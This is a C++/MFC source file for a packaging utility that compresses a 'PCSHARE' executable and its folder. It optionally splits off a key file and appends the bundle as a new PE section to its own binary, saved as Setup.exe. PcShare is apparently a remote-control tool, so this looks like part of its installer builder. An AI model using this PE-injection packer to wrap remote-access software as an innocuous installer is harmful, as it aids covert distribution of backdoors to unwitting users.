// UpPcShareDlg.cpp : implementation file
//

#include "stdafx.h"
#include "UpPcShare.h"
#include "UpPcShareDlg.h"
#include "Lzw.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

ULONGLONG m_CmdInfo[5] = {PS_CMD_ULONGLONG, 0, 0, 0, 0};

/////////////////////////////////////////////////////////////////////////////
// CUpPcShareDlg dialog

CUpPcShareDlg::CUpPcShareDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CUpPcShareDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CUpPcShareDlg)
	m_FileName = _T("");
	m_UserId = _T("");
	m_NoKey = FALSE;
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CUpPcShareDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CUpPcShareDlg)
	DDX_Text(pDX, IDC_EDIT_FILENAME, m_FileName);
	DDX_Text(pDX, IDC_EDIT_USER_ID, m_UserId);
	DDV_MaxChars(pDX, m_UserId, 24);
	DDX_Check(pDX, IDC_CHECK_ISKEY, m_NoKey);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CUpPcShareDlg, CDialog)
	//{{AFX_MSG_MAP(CUpPcShareDlg)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_BUTTON_GETFILE, OnButtonGetfile)
	ON_BN_CLICKED(IDC_CHECK_ISKEY, OnCheckIskey)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CUpPcShareDlg message handlers

BOOL CUpPcShareDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	// TODO: Add extra initialization here
	
	return TRUE;  // return TRUE  unless you set the focus to a control
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CUpPcShareDlg::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CUpPcShareDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}



void CUpPcShareDlg::OnOK() 
{
	UpdateData();
	if(m_FileName.IsEmpty() || m_UserId.IsEmpty())
	{
		return;
	}

	//本地路径
	CXTBrowseDialog dlg;
	dlg.SetTitle(_T("选择保存目录"));
	if(dlg.DoModal() != IDOK)
	{
		return;
	}

	//原始文件数据
	CFile m_File;
	if(!m_File.Open(m_FileName, CFile::modeRead))
	{
		MessageBox("打不开文件", "错误");
		return;
	}
	DWORD nMainFileLen = m_File.GetLength();
	BYTE* m_MainFileData = new BYTE[nMainFileLen];
	m_File.Read(m_MainFileData, nMainFileLen);
	m_File.Close();

	//压缩原始文件数据
	FCLzw lzw;
	BYTE* pZipMainFileData = new BYTE[nMainFileLen * 2];
	memset(pZipMainFileData, 0, nMainFileLen * 2);
	lzw.PcZip(m_MainFileData, pZipMainFileData, &nMainFileLen);
	delete [] m_MainFileData;

	if(!m_NoKey)
	{
		//保存key文件
		char m_KeyFileName[256] = {0};
		wsprintf(m_KeyFileName, "%s\\%s\\%s.rar", dlg.GetSelPath(), m_UserId, m_UserId);
		MakeFilePath(m_KeyFileName);
		if(!m_File.Open(m_KeyFileName, CFile::modeWrite|CFile::modeCreate))
		{
			delete [] pZipMainFileData;
			MessageBox("无法保存KEY文件", "错误");
			return ;
		}
		m_File.Write(pZipMainFileData, PS_CUT_FILE_LEN);
		m_File.Close();

		//保存后的主文件长度缓冲
		nMainFileLen -= PS_CUT_FILE_LEN;
	}

	//搜索其他文件个数，文件长度
	char m_FindFilePath[256] = {0};
	m_FileName.MakeLower();
	strcpy(m_FindFilePath, m_FileName);
	char* pFind = strrchr(m_FindFilePath, '\\');
	if(pFind != NULL)
	{
		*pFind = 0x00;
	}

	//文件头数据缓冲
	LPSAVEFILEINFO pFileInfo = new SAVEFILEINFO[100];
	memset(pFileInfo, 0, sizeof(SAVEFILEINFO) * 100);

	//其他文件
	DWORD nAllFileLen = 0;
	DWORD nFileCount = 0;
	FindCopyFile(m_FindFilePath, pFileInfo, nAllFileLen, nFileCount, m_FileName);
	
	//开始压缩保存
	DWORD nSaveLen = sizeof(DWORD) + 255 + nFileCount * sizeof(SAVEFILEINFO) +  nAllFileLen;
	BYTE* pSaveData = new BYTE[nSaveLen];
	memset(pSaveData, 0, nSaveLen);
	BYTE* pCurPoint = pSaveData;

	//保存文件个数
	memcpy(pCurPoint, &nFileCount, sizeof(DWORD));
	pCurPoint += sizeof(DWORD);

	//保存相对路径
	memcpy(pCurPoint, m_FindFilePath, strlen(m_FindFilePath));
	pCurPoint += 255;

	//保存文件头数据
	memcpy(pCurPoint, pFileInfo, nFileCount * sizeof(SAVEFILEINFO));
	pCurPoint += nFileCount * sizeof(SAVEFILEINFO);

	//保存其他文件体数据
	for(DWORD i = 0; i < nFileCount; i++)
	{
		ReadMyFile(pFileInfo[i].m_FilePath, pCurPoint, pFileInfo[i].m_FileLen);
		pCurPoint += pFileInfo[i].m_FileLen;
	}

	delete [] pFileInfo;

	//压缩保存数据
	BYTE* pSaveZipData = new BYTE[sizeof(ULONGLONG) + sizeof(DWORD) + nMainFileLen + nSaveLen + 655350];
	memset(pSaveZipData, 0, sizeof(ULONGLONG) + sizeof(DWORD) + nMainFileLen + nSaveLen + 655350);
	
	//保存查找标志
	*((ULONGLONG*) (pSaveZipData)) = PS_VER_ULONGLONG;

	//保存主控文件长度
	memcpy(pSaveZipData + sizeof(ULONGLONG), &nMainFileLen, sizeof(DWORD));

	if(!m_NoKey)
	{
		//保存主控文件
		memcpy(pSaveZipData + sizeof(ULONGLONG) + sizeof(DWORD), pZipMainFileData + PS_CUT_FILE_LEN, nMainFileLen);
	}
	else
	{
		memcpy(pSaveZipData + sizeof(ULONGLONG) + sizeof(DWORD), pZipMainFileData, nMainFileLen);
	}
	delete [] pZipMainFileData;

	//保存其他文件
	lzw.PcZip(pSaveData, pSaveZipData + sizeof(ULONGLONG) + sizeof(DWORD) + nMainFileLen, &nSaveLen);
	delete [] pSaveData;

	//取自身数据
	BYTE* pPeData = NULL;
	DWORD nPeFileLen = 0;
	char m_ExeName[256] = {0};
	GetModuleFileName(NULL, m_ExeName, 255);
	if(!GetMySource(m_ExeName, &pPeData, nPeFileLen))
	{
		delete [] pSaveZipData;
		return;
	}

	//修改EXE数据标志
	ULONGLONG* pCmd = NULL;
	for(i = 0; i < nPeFileLen; i++)
	{
		if(*((ULONGLONG*) &pPeData[i]) == PS_CMD_ULONGLONG)
		{
			pCmd = (ULONGLONG*) &pPeData[i];
			break;
		}
	}
	if(pCmd == NULL)
	{
		delete [] pSaveZipData;
		delete [] pPeData;
		return;
	}

	//解压类型
	if(!m_NoKey)
	{
		pCmd[1] = PS_START_KEY;
	}
	else
	{
		pCmd[1] = PS_START_NOKEY;
	}

	//用户标志
	memcpy(&pCmd[2], m_UserId, 24);

	//取保存文件名称
	char m_DesFileName[256] = {0};
	wsprintf(m_DesFileName, "%s\\%s\\Setup.exe", dlg.GetSelPath(), m_UserId);
	MakeFilePath(m_DesFileName);

	//保存文件到exe
	AddDataToPe(pSaveZipData, sizeof(ULONGLONG) + sizeof(DWORD) + nMainFileLen + nSaveLen, pPeData, nPeFileLen, m_DesFileName);

	delete [] pPeData;
	delete [] pSaveZipData;
}

BOOL CUpPcShareDlg::GetMySource(TCHAR* pFileName, BYTE** pFileData, DWORD& nFileLen)
{
	CFile m_File;
	if(!m_File.Open(pFileName, CFile::modeRead))
	{
		return FALSE;
	}
	nFileLen = m_File.GetLength();
	*pFileData = new BYTE[nFileLen];
	m_File.Read(*pFileData, nFileLen);
	m_File.Close();
	return TRUE;
}

BOOL CUpPcShareDlg::FindCopyFile(LPCTSTR m_ParentPath, LPSAVEFILEINFO pInfo, DWORD& nFileLen, DWORD& nFileCount, LPCTSTR pMainFile)
{
	TCHAR m_DirFindName[MAX_PATH] = {0};
	TCHAR m_FindPath[MAX_PATH] = {0};
	lstrcpy(m_FindPath, m_ParentPath);
	wsprintf(m_DirFindName, "%s\\*.*", m_FindPath);
	
	WIN32_FIND_DATA m_FindData = {0};
	HANDLE hFind = FindFirstFile(m_DirFindName, &m_FindData);
	if(hFind == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	char m_TmpStr[256] = {0};
	m_TmpStr[0] = '%';
	m_TmpStr[1] = 's';
	m_TmpStr[2] = '\\';
	m_TmpStr[3] = '%';
	m_TmpStr[4] = 's';

	BOOL fFinished = FALSE;
	TCHAR m_FilePath[MAX_PATH] = {0};
	while(!fFinished)
	{
		if(strcmp(m_FindData.cFileName, ".") != 0 && strcmp(m_FindData.cFileName, ".."))
		{
			wsprintf(m_FilePath, m_TmpStr, m_FindPath, m_FindData.cFileName);
			if(m_FindData.dwFileAttributes &FILE_ATTRIBUTE_DIRECTORY)
			{
				//目录
				if(!FindCopyFile(m_FilePath, pInfo, nFileLen, nFileCount, pMainFile))
				{
					return FALSE;
				}
			}
			else
			{
				if(nFileCount >= 99)
				{
					MessageBox("非法目录！", "错误");
					return FALSE;
				}
				CharLower(m_FindData.cFileName);
				if(strstr(pMainFile, m_FindData.cFileName) == NULL)
				{
					//文件
					wsprintf(pInfo[nFileCount].m_FilePath, "%s\\%s", m_ParentPath, m_FindData.cFileName);
					pInfo[nFileCount].m_FileLen = m_FindData.nFileSizeLow;
					nFileLen += pInfo[nFileCount].m_FileLen;
					nFileCount ++;
				}
			}
		
		}
		if(!FindNextFile(hFind, &m_FindData)) 
		{
			if(GetLastError() == ERROR_NO_MORE_FILES) 
			{ 
				fFinished = TRUE; 
			} 
			else 
			{ 
				//异常错误
				FindClose(hFind);
				return FALSE; 
			} 
		}
	}
	FindClose(hFind);
	return TRUE;
}

void CUpPcShareDlg::OnCancel() 
{
	
	CDialog::OnCancel();
}

void CUpPcShareDlg::OnButtonGetfile() 
{
	OPENFILENAME OpenFileName = {0};
	TCHAR szFile[MAX_PATH] = {0};
	TCHAR szFileName[MAX_PATH] = {0};
  	TCHAR szFilter[1024] = {0};
	lstrcpy(szFilter, _T("可执行文件(*.exe)"));
	lstrcpy(szFilter + lstrlen(szFilter) + 1, _T("*.exe"));
	OpenFileName.lStructSize       = sizeof(OPENFILENAME);
    OpenFileName.hwndOwner         = GetSafeHwnd();
	OpenFileName.lpstrFilter       = szFilter;
    OpenFileName.lpstrCustomFilter = NULL;
    OpenFileName.nMaxCustFilter    = 0;
    OpenFileName.nFilterIndex      = 0;
    OpenFileName.lpstrFile         = szFile;
    OpenFileName.nMaxFile          = sizeof(szFile);
    OpenFileName.lpstrFileTitle    = szFileName;
    OpenFileName.nMaxFileTitle     = sizeof(szFileName);
    OpenFileName.lpstrInitialDir   = NULL;
    OpenFileName.lpstrTitle        = _T("PCSHARE文件");
    OpenFileName.nFileOffset       = 0;
    OpenFileName.nFileExtension    = 0;
    OpenFileName.lpstrDefExt       = _T("exe");
    OpenFileName.Flags             = OFN_EXPLORER | OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT;
	if(!GetOpenFileName(&OpenFileName))
	{
		return;
	}
	m_FileName = szFile;
	UpdateData(FALSE);		
}

BOOL CUpPcShareDlg::AddDataToPe(BYTE* pSaveData, DWORD DataLen, BYTE* pPeData, DWORD nPeLen, LPCTSTR pPeFile)
{
	// PE头偏移
	DWORD dwPE_Header_OffSet = *(DWORD *)(pPeData + 0x3C);
	
	// 取得 PE 头
	IMAGE_NT_HEADERS *pPE_Header = (IMAGE_NT_HEADERS *)(pPeData + dwPE_Header_OffSet);
	
	// 判断是否有效的PE文件
	if (pPE_Header->Signature != IMAGE_NT_SIGNATURE)
	{
		return FALSE;
	}

	// 计算新节的偏移地址
	DWORD dwMySectionOffSet = dwPE_Header_OffSet;
	dwMySectionOffSet += 4;		//sizeof("PE\0\0")
	dwMySectionOffSet += sizeof(IMAGE_FILE_HEADER);
	dwMySectionOffSet += sizeof(IMAGE_OPTIONAL_HEADER32);
	dwMySectionOffSet += pPE_Header->FileHeader.NumberOfSections * 0x28;	//NumberOfSections * sizeof(IMAGE_SECTION_HEADER)

	// 检查PE头的空间够不够大
	if(dwMySectionOffSet + 0x28 > pPE_Header->OptionalHeader.SizeOfHeaders)
	{
		// 如果 PE 头的空间不足会失败！
		return FALSE;
	}

	// 新节
	IMAGE_SECTION_HEADER *pNewSec = (IMAGE_SECTION_HEADER *)(pPeData + dwMySectionOffSet);

	// 读取新节位置处的内容，本该是全0
	for (int i = 0; i != 0x28; ++i)
	{
		BYTE bt = *((PBYTE)pNewSec + i);
		if (bt)
		{
			// 非0，说明这个空间已经被那什么延迟加载占用了
			// 只有抹掉image_directory_entry_bound_im，腾出空间。
			memset(pPeData + dwPE_Header_OffSet + 0xD0, 0, 8);
			break;
		}
	}
	
	pNewSec->Misc.VirtualSize = DataLen;
	
	// 新节的RVA
	pNewSec->VirtualAddress = pPE_Header->OptionalHeader.SizeOfImage;

	//SizeOfRawData在EXE文件中是对齐到FileAlignMent的整数倍的值
	pNewSec->SizeOfRawData = DataLen;
	pNewSec->SizeOfRawData /= pPE_Header->OptionalHeader.FileAlignment;
	pNewSec->SizeOfRawData++;
	pNewSec->SizeOfRawData *= pPE_Header->OptionalHeader.FileAlignment;
	
	// 设置新节的 PointerToRawData
	pNewSec->PointerToRawData = nPeLen;
	
	// 设置新节的属性
	pNewSec->Characteristics = 0x40000040;		//可读,，已初始化

	// 增加NumberOfSections
	pPE_Header->FileHeader.NumberOfSections++;

	// 增加SizeOfImage
	pPE_Header->OptionalHeader.SizeOfImage += 
		(pNewSec->Misc.VirtualSize/pPE_Header->OptionalHeader.SectionAlignment + 1) * 
		pPE_Header->OptionalHeader.SectionAlignment;


	// 保存到文件
	HANDLE hFile = CreateFile(
		pPeFile,
		GENERIC_WRITE,
		FILE_SHARE_READ,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL );
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	
	DWORD dw = 0;
	if (!WriteFile(hFile, pPeData, nPeLen, &dw, NULL)) {
		CloseHandle(hFile);
		return FALSE;
	}
	
	if(!WriteFile(hFile, pSaveData, DataLen, &dw, NULL)) {
		CloseHandle(hFile);
		return FALSE;
	}

	// 查了N久的bug点：
	int extraLen = pNewSec->SizeOfRawData - DataLen;
	if (extraLen != 0) {
		BYTE * pExtra = new BYTE[extraLen];
		memset(pExtra, 0, extraLen);
		if(!WriteFile(hFile, pExtra, extraLen, &dw, NULL)) {
			delete [] pExtra;
			CloseHandle(hFile);
			return FALSE;
		}
		delete [] pExtra;
	}
	CloseHandle(hFile);
	return TRUE;
}

void CUpPcShareDlg::OnCheckIskey() 
{
	
}
